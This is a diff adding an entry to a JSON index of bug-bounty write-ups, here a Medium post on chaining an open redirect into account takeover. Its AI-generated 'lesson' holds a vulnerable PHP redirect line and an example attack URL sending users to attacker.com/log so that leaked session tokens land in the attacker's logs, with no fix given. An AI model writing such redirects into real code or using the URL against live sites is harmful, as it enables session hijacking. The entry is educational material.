@@ -1,5 +1,46 @@
 [
   {
+    "id": "92f1f311a460",
+    "title": "Chaining an Open Redirect Into Account Takeover (P1 · CVSS 9.0)",
+    "url": "https://medium.com/@josekuttykunnelthazhebinu/chaining-an-open-redirect-into-account-takeover-p1-cvss-9-0-a1aa68abb172",
+    "source": {
+      "slug": "medium-tag-bug-bounty",
+      "name": "Medium — #bug-bounty"
+    },
+    "authors": [
+      "Josekutty Kunnelthazhe Binu"
+    ],
+    "program": null,
+    "platform_slug": "self-disclosed",
+    "bounty_raw": null,
+    "published_at": "2026-11-08T23:28:54.000Z",
+    "added_at": "2026-11-09T03:07:17.664Z",
+    "categories": [
+      "auth-bypass",
+      "other"
+    ],
+    "severity": "critical",
+    "difficulty": "intermediate",
+    "summary_en": "A critical vulnerability where an open redirect is chained with another flaw to achieve full account takeover, rated CVSS 9.0.",
+    "summary_ar": null,
+    "lesson": {
+      "cause": null,
+      "walkthrough": null,
+      "example": "We assume the app uses a 'next' parameter (a piece of information passed in the web address) to decide where to send a user after they log in. \n\nVulnerable Code Snippet:\n`header('Location: ' . $_GET['next']);` \n(This tells the browser to go to whatever address is in 'next').\n\nAttack Request:\n`https://target.example/login?next=https://attacker.com/log` \n\nWhy it works: An Open Redirect (a flaw where a site sends users to any external address) becomes dangerous when chained. If the login system appends a 'session token' (a digital key that proves you are logged in) to the URL, like `https://attacker.com/log?token=123`, the attacker sees that token in their own server logs. They can then use that token to impersonate the user.",
+      "takeaway": null,
+      "fix": null,
+      "cause_ar": null,
+      "walkthrough_ar": null,
+      "example_ar": null,
+      "takeaway_ar": null,
+      "fix_ar": null
+    },
+    "excerpt": null,
+    "ai_generated": true,
+    "engagement": null,
+    "score": 60
+  },
+  {
     "id": "435d0e12ca05",
     "title": "My first AI bug report got closed within hours (and that was good for me)",
     "url": "https://medium.com/@manuelfdzgo/my-first-ai-bug-report-got-closed-within-hours-and-that-was-good-for-me-eb68c002c326",
